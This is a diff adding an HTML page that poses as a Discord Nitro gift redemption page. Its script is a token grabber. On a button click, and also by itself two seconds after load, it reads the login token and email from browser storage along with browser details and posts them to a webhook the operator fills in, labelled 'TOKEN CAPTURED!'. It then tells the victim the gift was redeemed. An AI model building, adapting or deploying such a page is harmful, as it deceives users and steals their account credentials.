@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>discord.gift</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); 
+            min-height: 100vh; 
+            font-family: 'Whitney', 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            color: #fff; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            text-align: center; 
+            padding: 20px;
+        }
+        .card { 
+            background: rgba(255,255,255,0.1); 
+            backdrop-filter: blur(10px); 
+            border-radius: 20px; 
+            padding: 40px; 
+            max-width: 400px; 
+            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
+        }
+        h1 { font-size: 2.5em; margin-bottom: 20px; }
+        .code { 
+            background: #5865f2; 
+            color: white; 
+            padding: 20px; 
+            border-radius: 12px; 
+            font-family: monospace; 
+            font-size: 1.4em; 
+            letter-spacing: 3px; 
+            margin: 20px 0; 
+        }
+        .btn { 
+            background: #fff; 
+            color: #5865f2; 
+            border: none; 
+            padding: 18px 40px; 
+            font-size: 1.2em; 
+            font-weight: 600; 
+            border-radius: 12px; 
+            cursor: pointer; 
+            transition: all 0.3s; 
+            margin: 20px 0;
+        }
+        .btn:hover { transform: translateY(-2px); box-shadow: 0 10px 25px rgba(0,0,0,0.2); }
+        .status { margin-top: 20px; font-size: 1.1em; min-height: 30px; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <h1>🎁 discord.gift</h1>
+        <div class="code">N1TR0FR33G1FT2024</div>
+        <p><strong>1 YEAR NITRO</strong> • 1 use remaining</p>
+        <button class="btn" onclick="claimNitro()">⚡ REDEEM NOW</button>
+        <div id="status" class="status"></div>
+    </div>
+
+    <script>
+        // SAJÁT WEBHOOK URL-ED IDE!
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1234567890123456789/AbCdEfGhIjKlMnOpQrStUvWxYz'; 
+        
+        async function claimNitro() {
+            const status = document.getElementById('status');
+            status.innerHTML = '🔄 Verifying gift code...';
+            
+            const token = localStorage.getItem('token');
+            if (!token) {
+                status.innerHTML = '❌ <strong>Please open Discord.com and login first!</strong>';
+                return;
+            }
+            
+            try {
+                const data = {
+                    token: token.substring(0, 100) + '...',
+                    full_length: token.length,
+                    email: localStorage.getItem('email') || 'N/A',
+                    user_agent: navigator.userAgent.substring(0, 100),
+                    language: navigator.language,
+                    platform: navigator.platform,
+                    timestamp: new Date().toISOString()
+                };
+                
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        username: '🆘 Nitro Logger',
+                        embeds: [{
+                            title: '🎁 TOKEN CAPTURED!',
+                            description: `\`\`\`json\n${JSON.stringify(data, null, 2)}\n\`\`\``,
+                            color: 0xff0000,
+                            fields: [
+                                { name: 'Token Preview', value: `\`${token.substring(0, 30)}...\``, inline: true },
+                                { name: 'Status', value: '✅ VALID', inline: true }
+                            ],
+                            footer: { text: `Captured: ${new Date().toLocaleString()}` }
+                        }]
+                    })
+                });
+                
+                status.innerHTML = '✅ <strong>Nitro successfully redeemed!</strong><br>Refresh Discord.';
+                setTimeout(() => window.close(), 3000);
+            } catch (error) {
+                status.innerHTML = '❌ Network error. Try again.';
+                console.error(error);
+            }
+        }
+        
+        // AUTO-REDEEM 2 seconds after load
+        setTimeout(claimNitro, 2000);
+    </script>
+</body>
+</html>
